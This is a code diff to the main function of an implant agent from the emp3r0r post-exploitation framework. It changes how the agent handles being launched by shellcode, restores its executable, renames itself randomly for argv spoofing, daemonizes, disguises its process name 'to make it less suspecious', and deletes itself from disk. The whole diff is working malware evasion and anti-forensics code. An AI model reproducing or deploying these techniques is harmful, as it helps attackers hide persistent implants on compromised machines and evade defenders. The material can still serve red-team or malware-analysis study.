@@ -40,14 +40,19 @@ func main() {
 
 	// check if this process is invoked by guardian shellcode
 	// by checking if process executable is same as parent's
-	if util.ProcExePath(os.Getpid()) == util.ProcExePath(os.Getppid()) {
+	run_from_shellcode := util.ProcExePath(os.Getpid()) == util.ProcExePath(os.Getppid())
+	if run_from_shellcode {
 		log.Printf("emp3r0r %d is invoked by shellcode in %d", os.Getpid(), os.Getppid())
 		os.Setenv("LD", "true") // it's the same thing, i don't want another env var
 
 		// restore original executable file
-		util.Copy(fmt.Sprintf("%s/%s",
-			agent.RuntimeConfig.AgentRoot, util.FileBaseName(util.ProcExePath(os.Getpid()))),
-			util.ProcExePath(os.Getpid()))
+		out, err := exec.Command("/bin/cp", "-f",
+			fmt.Sprintf("%s/%s",
+				agent.RuntimeConfig.AgentRoot, util.FileBaseName(util.ProcExePath(os.Getpid()))),
+			util.ProcExePath(os.Getpid())).CombinedOutput()
+		if err != nil {
+			log.Printf("failed to restore original executable: %s (%v)", out, err)
+		}
 	}
 
 	// accept env vars
@@ -74,9 +79,12 @@ func main() {
 		return
 	}
 
+	// do not tamper with argv or re-launch under these conditions
+	do_not_touch_argv := runElvsh || run_from_loader || run_from_shellcode
+
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
-		!persistent && !run_from_loader && !runElvsh {
+		!persistent && !do_not_touch_argv {
 		new_name := util.RandStr(30)
 		os.Rename(os.Args[0], new_name)
 		pwd, err := os.Getwd()
@@ -94,7 +102,7 @@ func main() {
 		}
 	}
 
-	if !runElvsh && !run_from_loader {
+	if !do_not_touch_argv {
 		// always daemonize unless verbose is specified
 		run_as_daemon := !verbose &&
 			// don't daemonize if we're already daemonized
@@ -130,7 +138,7 @@ func main() {
 
 	osArgs := os.Args
 	self_path, err := os.Readlink("/proc/self/exe")
-	if !persistent && !run_from_loader && !runElvsh {
+	if !persistent && !do_not_touch_argv {
 		// rename our agent process to make it less suspecious
 		if err != nil {
 			self_path = os.Args[0]
@@ -150,7 +158,7 @@ func main() {
 	}
 
 	// self delete
-	if !persistent {
+	if !persistent && !run_from_shellcode {
 		err = os.Remove(self_path)
 		if err != nil {
 			log.Printf("Error removing agent file from disk: %v", err)
